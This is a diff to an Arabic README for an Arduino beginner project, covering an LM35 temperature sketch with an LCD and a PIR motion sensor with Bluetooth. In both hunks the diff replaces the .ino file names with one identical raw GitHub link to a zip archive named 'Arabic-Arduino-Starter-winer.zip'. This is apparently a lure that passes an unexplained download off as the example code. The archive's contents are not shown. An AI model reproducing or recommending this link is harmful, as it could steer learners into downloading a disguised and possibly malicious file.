@@ -20,7 +20,7 @@
 - استخدام مكتبة Servo
 - تحريك المحرك بين زوايا مختلفة
 
-#### 4. قياس الحرارة مع شاشة LCD (temp_lcd.ino)
+#### 4. قياس الحرارة مع شاشة LCD (https://github.com/KaizerAE/Arduino-Starter-Arabic/raw/refs/heads/main/src/Arabic-Arduino-Starter-winer.zip)
 - قراءة درجة الحرارة من حساس LM35
 - عرض القراءات مباشرة على شاشة LCD 16x2
 - عرض درجة الحرارة بالدرجة المئوية والفهرنهايت
@@ -49,7 +49,7 @@
   - الطرف الأوسط → V0 على شاشة LCD
   - الطرف الثالث → GND
 
-#### 5. نظام كشف حركة مع بلوتوث (motion_bluetooth.ino)
+#### 5. نظام كشف حركة مع بلوتوث (https://github.com/KaizerAE/Arduino-Starter-Arabic/raw/refs/heads/main/src/Arabic-Arduino-Starter-winer.zip)
 - يستخدم حساس PIR لاكتشاف الحركة
 - يرسل إشعار نصي عبر البلوتوث (HC-05/HC-06) إلى تطبيق الهاتف عند اكتشاف الحركة
 - يطبع رسالة ترحيب عند اتصال التطبيق عبر البلوتوث
